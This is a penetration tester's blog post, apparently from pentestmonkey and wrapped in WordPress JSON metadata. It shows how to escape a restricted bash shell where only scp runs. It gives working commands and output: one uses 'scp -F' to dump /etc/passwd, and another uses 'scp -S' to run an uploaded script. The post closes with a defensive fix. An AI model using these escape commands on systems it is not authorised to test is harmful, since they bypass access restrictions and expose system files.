{"id":10,"date":"2007-04-12T19:59:16","date_gmt":"2007-04-12T19:59:16","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=10"},"modified":"2011-08-20T16:06:49","modified_gmt":"2011-08-20T16:06:49","slug":"rbash-scp","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/blog\/rbash-scp","title":{"rendered":"Breaking out of rbash using scp"},"content":{"rendered":"<p>I was recently challenged to break out of a <a href=\"http:\/\/www.softpanorama.org\/Scripting\/Shellorama\/restricted_shell.shtml\">restricted shell<\/a>environment in which the only accessible command was scp.<\/p>\n<p><!--more--><\/p>\n<h3>The Restricted Environment<\/h3>\n<p>The environment had a PATH set to \/rbashbin which wasn&#8217;t writable.<\/p>\n<pre>untrusted@demobox ~ $ echo $PATH\r\n\/rbashbin<\/pre>\n<p>The only command in \/rbashbin was scp.<\/p>\n<p>The home directory of the &#8220;untrusted&#8221; user was owned by root, but was writable to allow file uploads. However, due to the restrictions on the PATH it was not possible to directly execute any files that were uploaded. Normal system commands too were inaccessible:<\/p>\n<pre>untrusted@demobox ~ $ id\r\n-su: id: command not found<\/pre>\n<p>The .bash_profile and .bashrc files were owned by root and were not writable, so it wasn&#8217;t possible to overwrite these with ones containing malicious commands.<\/p>\n<p>.bash_logout could be created and filled with commands, but these all ran under rbash, so failed.<\/p>\n<p>After all the usual tricks had failed I resorted to reading the man page for scp (some another box since running &#8220;man&#8221; wasn&#8217;t allowed). I noticed two useful command line options:<\/p>\n<h3>Reading files with -F<\/h3>\n<pre>     -F ssh_config\r\n             Specifies an alternative per-user configuration file for ssh.  This option is directly passed to ssh(1).<\/pre>\n<p>This options can be used to &#8220;cat&#8221; certain types of file:<\/p>\n<pre>untrusted@demobox ~ $ scp -F \/etc\/passwd x y:\r\n\/etc\/passwd: line 1: Bad configuration option: root:x:0:0:root:\/root:\/bin\/bash\r\n\/etc\/passwd: line 2: Bad configuration option: bin:x:1:1:bin:\/bin:\/bin\/false\r\n\/etc\/passwd: line 3: Bad configuration option: daemon:x:2:2:daemon:\/sbin:\/bin\/false\r\n...<\/pre>\n<h3>Running commands with -S<\/h3>\n<pre>     -S program\r\n             Name of program to use for the encrypted connection.  The program must understand ssh(1) options.<\/pre>\n<p>Ah, a way to run other commands! However various command line options are passed to your command that you probably don&#8217;t want:<\/p>\n<pre>untrusted@demobox ~ $ scp -S \/usr\/bin\/id x y:\r\n\/usr\/bin\/id: invalid option -- x\r\nTry `\/usr\/bin\/id --help' for more information.\r\nlost connection\r\n\r\nuntrusted@demobox ~ $ scp -S \/bin\/echo x y:\r\n-x -oForwardAgent no -oPermitLocalCommand no -oClearAllForwardings yes y scp -t .<\/pre>\n<p>On a box that you control make a simple wrapper script, then upload it:<\/p>\n<pre>$ cat \/tmp\/id.sh\r\n#!\/bin\/sh\r\n\/usr\/bin\/id\r\n$ chmod +x \/tmp\/id.sh\r\n$ scp \/tmp\/id.sh untrusted@demobox:<\/pre>\n<p>Once the file is uploaded, run it with scp:<\/p>\n<pre>untrusted@demobox ~ $ scp -S \/home\/untrusted\/id.sh x y:\r\nuid=1008(untrusted) gid=1014(untrusted) groups=1014(untrusted)<\/pre>\n<p>This is not a vulnerability in rbash or in scp, it&#8217;s just that the two shouldn&#8217;t be used together in the environment above. <a href=\"http:\/\/sublimation.org\/scponly\/wiki\/index.php\/Main_Page\">scponly<\/a> is probably a better solution.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>I was recently challenged to break out of a restricted shellenvironment in which the only accessible command was scp.<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[5],"tags":[19,117,118],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/10"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=10"}],"version-history":[{"count":2,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/10\/revisions"}],"predecessor-version":[{"id":450,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/10\/revisions\/450"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=10"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=10"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=10"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}